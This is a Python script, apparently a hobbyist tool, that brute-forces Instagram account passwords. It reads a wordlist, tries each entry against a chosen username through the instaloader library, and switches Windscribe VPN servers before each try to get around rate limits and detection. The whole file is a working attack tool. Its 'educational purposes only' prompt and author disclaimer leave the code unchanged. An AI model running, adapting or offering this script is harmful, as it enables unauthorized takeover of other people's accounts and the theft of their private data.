import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
clear = sub.call("clear")
clear
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'

print(bcolors.OKBLUE+'''
 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄        ▄████  ██▀███   ▄▄▄       ███▄ ▄███▓   
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄     ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒   
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░   
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██    
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒   
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░ ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░   
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░   
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░ ░   ░   ░░   ░   ░   ▒   ░      ░      
 ░           ░       ░                 ░  ░      ░    ░           ░  ░       ░      bruteforce

⚜Kubilay Erkuş⚜
https://www.instagram.com/kubilayyerkuss
'''
+bcolors.ENDC)
print(bcolors.WARNING+"\n\n𝙩𝙝𝙚 𝙖𝙪𝙩𝙝𝙤𝙧 𝙖𝙨𝙨𝙪𝙢𝙚𝙨 𝙣𝙤 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙞𝙗𝙞𝙡𝙞𝙩𝙮 𝙛𝙤𝙧 𝙝𝙤𝙬 𝙩𝙝𝙞𝙨 𝙘𝙤𝙣𝙩𝙚𝙣𝙩 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙪𝙨𝙚𝙙\n=======================================================================\n\n"+bcolors.ENDC)
sceltadisc = input("\n\nUse this content for educational purposes only? [yes/no]: ")
if sceltadisc == "yes":
    print("\n")
    clear
else:
    exit()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]

L = instaloader.Instaloader()

print("\nVpn starting...\n")
print(bcolors.OKBLUE+"Vpn successiful started"+bcolors.ENDC)
while True:
	USER = ""
	USER = input('\nEnter Instagram Username to bruteforce: ')
	wl = input("\nEnter world list name: ")
	sleepp = int(input("\nInsert sleep time for login [Raccomanded 900(15min)]: "))
	sub.call("clear")
	procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
	if procedere == "y":
		break
	elif procedere == "modify":
		print("\nReturn...")
	elif procedere == "break":
		exit()



file1 = open(wl, 'r')
Lines = file1.readlines()
 
count = 0

# Strips the newline character
for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(1)
        print("\n[Changing ip address]")
        os.system("\nwindscribe connect " + choiceCode)
        print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
        L.login(USER , PASSWORD)
        print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
        break
        print("\n Turn off vpn")
        os.system("\nwindscribe disconnect ")
    except instaloader.exceptions.BadCredentialsException:
        pass
        print(bcolors.FAIL+"Incorret password: "+pstest+bcolors.ENDC)
        print("sleep for "+ str(sleepp))
        time.sleep(sleepp)

    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\nInstagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
        break
        print("\n Turn off vpn")
        os.system("\nwindscribe disconnect ")
    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)
        print("\n Turn off vpn")
        os.system("\nwindscribe disconnect ")
